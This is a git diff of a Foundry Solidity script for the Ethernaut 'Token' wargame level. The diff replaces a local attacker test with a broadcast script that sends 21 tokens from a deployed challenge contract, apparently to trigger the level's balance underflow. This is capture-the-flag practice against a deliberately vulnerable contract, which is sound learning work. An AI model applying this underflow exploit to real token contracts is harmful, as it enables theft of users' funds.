@@ -5,26 +5,27 @@ import {Test, console} from "forge-std/Test.sol";
 
 import {Token} from "../../src/ethernaut/Token.sol";
 
-contract TokenHack is Test{
-    Token target;
+contract tokenHackScript is Test {
+    Token public contractInstance;
 
     function setUp() public {
-        target = new Token(100);
+        contractInstance = Token(0x00Ea5B6a793c09826F54f0ac4a73248A2901E574);
     }
 
-    function test_Token() public {
-        address attacker = vm.addr(1);
-        uint256 balance = 1 ether;
-        vm.deal(attacker, balance);
-
-        uint256 balanceBefore = target.balanceOf(attacker);
-        assertEq(balanceBefore, 0);
-
-        // Attack
-        vm.startPrank(attacker);
-        target.transfer(address(target), 100);
-
-        uint256 balanceAfter = target.balanceOf(attacker);
-        assertEq(balanceAfter, 100);
+    function test_run() public {
+        vm.startBroadcast();
+        console.log(
+            "Current balance is :",
+            contractInstance.balanceOf(msg.sender)
+        );
+        contractInstance.transfer(
+            0x55C76828DF0ef0EB13DEA4503C8FAad51Abd00Ad,
+            21
+        );
+        console.log(
+            "New balance is :",
+            contractInstance.balanceOf(msg.sender)
+        );
+        vm.stopBroadcast();
     }
 }
